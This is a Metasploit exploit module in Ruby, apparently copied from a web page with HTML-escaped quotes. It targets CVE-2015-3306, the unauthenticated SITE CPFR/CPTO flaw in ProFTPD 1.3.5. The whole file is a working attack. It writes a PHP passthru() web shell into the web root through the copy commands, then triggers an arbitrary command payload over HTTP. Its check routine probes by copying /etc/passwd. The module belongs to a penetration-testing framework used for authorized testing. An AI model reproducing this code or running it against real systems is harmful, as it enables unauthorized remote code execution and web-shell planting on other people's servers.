# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require &#039;msf/core&#039;

class Metasploit3 < Msf::Exploit::Remote

  Rank = ExcellentRanking

  include Msf::Exploit::Remote::Tcp
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;ProFTPD 1.3.5 Mod_Copy Command Execution&#039;,
      &#039;Description&#039;    => %q{
          This module exploits the SITE CPFR/CPTO commands in ProFTPD version 1.3.5.
          Any unauthenticated client can leverage these commands to copy files from any
          part of the filesystem to a chosen destination. The copy commands are executed with
          the rights of the ProFTPD service, which by default runs under the privileges of the
          &#039;nobody&#039; user. By using /proc/self/cmdline to copy a PHP payload to the website
          directory, PHP remote code execution is made possible.
      },
      &#039;Author&#039;         =>
        [
          &#039;Vadim Melihow&#039;, # Original discovery, Proof of Concept
          &#039;xistence <xistence[at]0x90.nl>&#039; # Metasploit module
        ],
      &#039;License&#039;        => MSF_LICENSE,
      &#039;References&#039;     =>
        [
          [ &#039;CVE&#039;, &#039;2015-3306&#039; ],
          [ &#039;EDB&#039;, &#039;36742&#039; ]
        ],
      &#039;Privileged&#039;     => false,
      &#039;Platform&#039;       => [ &#039;unix&#039; ],
      &#039;Arch&#039;           => ARCH_CMD,
      &#039;Payload&#039;        =>
        {
          &#039;BadChars&#039; => &#039;&#039;,
          &#039;Compat&#039;      =>
            {
              &#039;PayloadType&#039; => &#039;cmd&#039;,
              &#039;RequiredCmd&#039; => &#039;generic gawk bash python perl&#039;
            }
        },
      &#039;Targets&#039;        =>
        [
          [ &#039;ProFTPD 1.3.5&#039;, { } ]
        ],
      &#039;DisclosureDate&#039; => &#039;Apr 22 2015&#039;,
      &#039;DefaultTarget&#039; => 0))

    register_options(
      [
        OptPort.new(&#039;RPORT&#039;, [true, &#039;HTTP port&#039;, 80]),
        OptPort.new(&#039;RPORT_FTP&#039;, [true, &#039;FTP port&#039;, 21]),
        OptString.new(&#039;TARGETURI&#039;, [true, &#039;Base path to the website&#039;, &#039;/&#039;]),
        OptString.new(&#039;TMPPATH&#039;, [true, &#039;Absolute writable path&#039;, &#039;/tmp&#039;]),
        OptString.new(&#039;SITEPATH&#039;, [true, &#039;Absolute writable website path&#039;, &#039;/var/www&#039;])
      ], self.class)
  end

  def check
    ftp_port = datastore[&#039;RPORT_FTP&#039;]
    sock = Rex::Socket.create_tcp(&#039;PeerHost&#039; => rhost, &#039;PeerPort&#039; => ftp_port)

    if sock.nil?
      fail_with(Failure::Unreachable, "#{rhost}:#{ftp_port} - Failed to connect to FTP server")
    else
      print_status("#{rhost}:#{ftp_port} - Connected to FTP server")
    end

    res = sock.get_once(-1, 10)
    unless res && res.include?(&#039;220&#039;)
      fail_with(Failure::Unknown, "#{rhost}:#{ftp_port} - Failure retrieving ProFTPD 220 OK banner")
    end

    sock.puts("SITE CPFR /etc/passwd\r\n")
    res = sock.get_once(-1, 10)
    if res && res.include?(&#039;350&#039;)
      Exploit::CheckCode::Vulnerable
    else
      Exploit::CheckCode::Safe
    end
  end

  def exploit
    ftp_port = datastore[&#039;RPORT_FTP&#039;]
    get_arg = rand_text_alphanumeric(5+rand(3))
    payload_name = rand_text_alphanumeric(5+rand(3)) + &#039;.php&#039;

    sock = Rex::Socket.create_tcp(&#039;PeerHost&#039; => rhost, &#039;PeerPort&#039; => ftp_port)

    if sock.nil?
      fail_with(Failure::Unreachable, "#{rhost}:#{ftp_port} - Failed to connect to FTP server")
    else
      print_status("#{rhost}:#{ftp_port} - Connected to FTP server")
    end

    res = sock.get_once(-1, 10)
    unless res && res.include?(&#039;220&#039;)
      fail_with(Failure::Unknown, "#{rhost}:#{ftp_port} - Failure retrieving ProFTPD 220 OK banner")
    end

    print_status("#{rhost}:#{ftp_port} - Sending copy commands to FTP server")

    sock.puts("SITE CPFR /proc/self/cmdline\r\n")
    res = sock.get_once(-1, 10)
    unless res && res.include?(&#039;350&#039;)
      fail_with(Failure::Unknown, "#{rhost}:#{ftp_port} - Failure copying from /proc/self/cmdline")
    end

    sock.put("SITE CPTO #{datastore[&#039;TMPPATH&#039;]}/.<?php passthru($_GET[\&#039;#{get_arg}\&#039;]);?>\r\n")
    res = sock.get_once(-1, 10)
    unless res && res.include?(&#039;250&#039;)
      fail_with(Failure::Unknown, "#{rhost}:#{ftp_port} - Failure copying to temporary payload file")
    end

    sock.put("SITE CPFR #{datastore[&#039;TMPPATH&#039;]}/.<?php passthru($_GET[\&#039;#{get_arg}\&#039;]);?>\r\n")
    res = sock.get_once(-1, 10)
    unless res && res.include?(&#039;350&#039;)
      fail_with(Failure::Unknown, "#{rhost}:#{ftp_port} - Failure copying from temporary payload file")
    end

    sock.put("SITE CPTO #{datastore[&#039;SITEPATH&#039;]}/#{payload_name}\r\n")
    res = sock.get_once(-1, 10)
    unless res && res.include?(&#039;250&#039;)
      fail_with(Failure::Unknown, "#{rhost}:#{ftp_port} - Failure copying PHP payload to website path, directory not writable?")
    end

    sock.close

    print_status("#{peer} - Executing PHP payload #{target_uri.path}#{payload_name}")
    res = send_request_cgi!(
      &#039;uri&#039; => normalize_uri(target_uri.path, payload_name),
      &#039;method&#039; => &#039;GET&#039;,
      &#039;vars_get&#039; => { get_arg => "nohup #{payload.encoded} &" }
    )

    unless res && res.code == 200
      fail_with(Failure::Unknown, "#{rhost}:#{ftp_port} - Failure executing payload")
    end
  end

end

